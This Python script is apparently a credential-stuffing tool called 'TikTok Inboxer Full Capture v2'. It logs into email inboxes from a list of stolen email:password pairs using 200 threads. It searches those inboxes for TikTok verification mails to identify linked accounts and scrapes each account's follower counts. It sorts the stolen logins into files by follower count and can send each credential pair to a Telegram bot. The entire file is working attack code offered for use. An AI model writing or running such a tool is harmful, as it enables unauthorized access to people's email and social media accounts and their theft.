import sys
import imaplib
import email
import re
import requests
import datetime
import threading
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore
import colorama
import pyfiglet
import os

colorama.init()
colorama.init()
G = '\033[1;34;40m'
Z = '\x1b[2;31m'
BBBB = '\033[1;33m'
sma7liya = pyfiglet.figlet_format('TIKTOK')
print(Z + sma7liya)
print(BBBB)

# Global counters and lock
hits = 0
bad = 0
bans = 0
total_likes = 0

# Category counters
cat_100_500 = 0
cat_600_1500 = 0
cat_1600_5000 = 0
cat_6000_100K = 0
cat_100k_1M = 0

send_to_telegram = False
bot_token = ""
chat_id = ""

stats_lock = threading.Lock()

def update_stats():
    with stats_lock:
        stats = (
            "\n -- @P47_4\n\n"
            f" {Fore.GREEN}Hits{Fore.WHITE}: {hits} | {Fore.RED}Bad{Fore.WHITE}: {bad} | {Fore.YELLOW}Banned{Fore.WHITE}: {bans}\n"
            + ("—" * 60) + "\n\n"
            f" {Fore.CYAN}[∎]> 100 - 500{Fore.WHITE}: {cat_100_500}\n"
            f" {Fore.CYAN}[∎]> 600 - 1500{Fore.WHITE}: {cat_600_1500}\n"
            f" {Fore.CYAN}[∎]> 1600 - 5000{Fore.WHITE}: {cat_1600_5000}\n"
            f" {Fore.CYAN}[∎]> 6000 - 100,000{Fore.WHITE}: {cat_6000_100K}\n"
            f" {Fore.CYAN}[∎]> 100,001 - 1M{Fore.WHITE}: {cat_100k_1M}\n"
        )
        sys.stdout.write(stats)
        sys.stdout.flush()

def get_imap_server(email_addr):
    domain = email_addr.split('@')[-1]
    return f"imap.{domain}"

def send_telegram_message(message):
    global bot_token, chat_id
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    requests.post(url, data=data)

def get_category_file_and_update_counter(followers, result):
    global cat_100_500, cat_600_1500, cat_1600_5000, cat_6000_100K, cat_100k_1M
    if 100 <= followers <= 500:
        filename = "100-500.txt"
        cat_100_500 += 1
    elif 600 <= followers <= 1500:
        filename = "600-1500.txt"
        cat_600_1500 += 1
    elif 1600 <= followers <= 5000:
        filename = "1600-5000.txt"
        cat_1600_5000 += 1
    elif 6000 <= followers <= 100000:
        filename = "6000-100K.txt"
        cat_6000_100K += 1
    elif 100001 <= followers <= 1000000:
        filename = "100k-1M.txt"
        cat_100k_1M += 1
    else:
        filename = "others.txt"
    with open(filename, "a", encoding="utf-8", errors="ignore") as f:
        f.write(result)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def capture(email_addr, password, username):
    global hits, bans, total_likes, send_to_telegram
    try:
        ua = UserAgent()
        headers = {'user-agent': ua.random}
        response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
        
        if '"userInfo":{"user":{' not in response:
            return
        
        data = response.split('"userInfo":{"user":{')[1].split('</sc')[0]
        followers_match = re.search(r'"followerCount":(\d+)', data)
        if not followers_match:
            return
        followers = int(followers_match.group(1))
        
        if followers >= 100:
            user_id = re.search(r'"id":"(.*?)"', data).group(1)
            nickname = re.search(r'"nickname":"(.*?)"', data).group(1)
            following = re.search(r'"followingCount":(\d+)', data).group(1)
            likes = int(re.search(r'"heart":(\d+)', data).group(1))  
            videos = re.search(r'"videoCount":(\d+)', data).group(1) if re.search(r'"videoCount":(\d+)', data) else "N/A"
            friends_count = re.search(r'"friendCount":(\d+)', data).group(1) if re.search(r'"friendCount":(\d+)', data) else "N/A"
            is_private = "Yes" if re.search(r'"privateAccount":(true|false)', data) and re.search(r'"privateAccount":(true|false)', data).group(1) == "true" else "No"
            is_verified = "Yes" if re.search(r'"verified":(true|false)', data) and re.search(r'"verified":(true|false)', data).group(1) == "true" else "No"
            is_seller = "Yes" if re.search(r'"commerceInfo":{"seller":(true|false)', data) and re.search(r'"commerceInfo":{"seller":(true|false)', data).group(1) == "true" else "No"
            language = re.search(r'"language":"(.*?)"', data).group(1) if re.search(r'"language":"(.*?)"', data) else "N/A"
            date_create = datetime.datetime.fromtimestamp(int(re.search(r'"createTime":(\d+)', data).group(1))).strftime("%Y-%m-%d")
            region = re.search(r'"region":"(.*?)"', data).group(1)

            total_likes += likes

            result = (
                f"{email_addr}:{password} | Username = {username} | Followers = {followers} | "
                f"Following = {following} | Friends = {friends_count} | Likes = {likes} | "
                f"Videos = {videos} | Private = {is_private} | Verified = {is_verified} | "
                f"TikTok Seller = {is_seller} | Language = {language} | "
                f"Country = {region} | Created at = {date_create}\n"
            )
            
            get_category_file_and_update_counter(followers, result)
            
            hits += 1
            update_stats()

            if send_to_telegram:
                message = (
                    f"🥶 *TikTok Hit Found!*\n\n"
                    f"👺 *Username:* `{username}`\n"
                    f"😈 *Followers:* `{followers}`\n"
                    f"☠️ *Likes:* `{likes}`\n"
                    f"🥷 *Videos:* `{videos}`\n"
                    f"✅ *Verified:* `{is_verified}`\n"
                    f"🥷 *Seller:* `{is_seller}`\n"
                    f"❤️ *Region:* `{region}`\n"
                    f"🤌 *Created:* `{date_create}`\n"
                    f"✈️ *Login:* `{email_addr}:{password}`"
                )
                send_telegram_message(message)
    
    except Exception as e:
        bans += 1
        update_stats()

def check_email(email_addr, password):
    global bad, bans
    try:
        imap_server = get_imap_server(email_addr)
        mail = imaplib.IMAP4_SSL(imap_server)
        mail.login(email_addr, password)
        mail.select("inbox")
        
        result, data = mail.search(None, 'FROM "register@account.tiktok.com" SUBJECT "is your verification"')
        
        if result == "OK" and data[0]:
            for num in data[0].split():
                result, msg_data = mail.fetch(num, "(BODY[HEADER.FIELDS (SUBJECT FROM)])")
                if result == "OK":
                    for response_part in msg_data:
                        if isinstance(response_part, tuple):
                            raw_email = response_part[1]
                            msg = email.message_from_bytes(raw_email)
                            subject = msg["Subject"]
                            
                            if subject and "is your verification" in subject.lower():
                                result, body_data = mail.fetch(num, "(BODY[TEXT])")
                                for part in body_data:
                                    if isinstance(part, tuple):
                                        body = part[1].decode("utf-8", errors="ignore")
                                        if "To change your password" in body:
                                            match = re.search(r"Hi\s+([a-zA-Z0-9_.-]+),", body)
                                            if match:
                                                username = match.group(1)
                                                capture(email_addr, password, username)
                                                mail.logout()
                                                clear_screen()  # Clear the screen after each check
                                                return
        bad += 1
        update_stats()
        clear_screen()  # Clear the screen after each check
    
    except imaplib.IMAP4.error:
        bad += 1
        update_stats()
        clear_screen()  # Clear the screen after each check
    
    except Exception as e:
        bad += 1
        update_stats()
        clear_screen()  # Clear the screen after each check

def main():
    global send_to_telegram, bot_token, chat_id
    try:
        combo_file = input(" -- @P47_4 | TikTok Inboxer Full Capture v2\n\n [×] Put Combo: ").strip()
        print("—" * 60)
        
        send_choice = input(" [×] Do you want to send results to Telegram? (yes/no): ").strip().lower()
        if send_choice == "yes":
            send_to_telegram = True
            bot_token = input(" [×] Enter Bot Token: ").strip()
            chat_id = input(" [×] Enter Chat ID: ").strip()
            print("—" * 60)

        with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
            valid_combos = [line.strip() for line in f if ":" in line]

        if not valid_combos:
            return
        
        with ThreadPoolExecutor(max_workers=200) as executor:
            for combo in valid_combos:
                try:
                    email_addr, password = combo.split(":", 1)
                    executor.submit(check_email, email_addr, password)
                except ValueError:
                    continue

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
